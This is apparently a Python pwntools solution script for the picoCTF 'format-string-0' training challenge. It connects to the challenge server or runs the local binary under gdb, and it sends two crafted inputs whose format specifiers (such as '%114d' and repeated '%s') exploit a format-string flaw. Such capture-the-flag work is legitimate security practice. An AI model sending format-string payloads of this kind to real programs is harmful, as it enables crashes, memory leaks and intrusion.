from pwn import *

script = 'b *main'
context.terminal = ['tmux', 'splitw', '-h']
if args['REMOTE']:
  p = remote('mimas.picoctf.net', 60730)
else:
  p = process('./format-string-0')
  gdb.attach(p, gdbscript=script)
 
p.sendlineafter(b'recommendation: ', b'Gr%114d_Cheese')

p.sendlineafter(b'recommendation: ', b'Cla%sic_Che%s%steakCla%sic_Che%s%steak')

p.interactive()

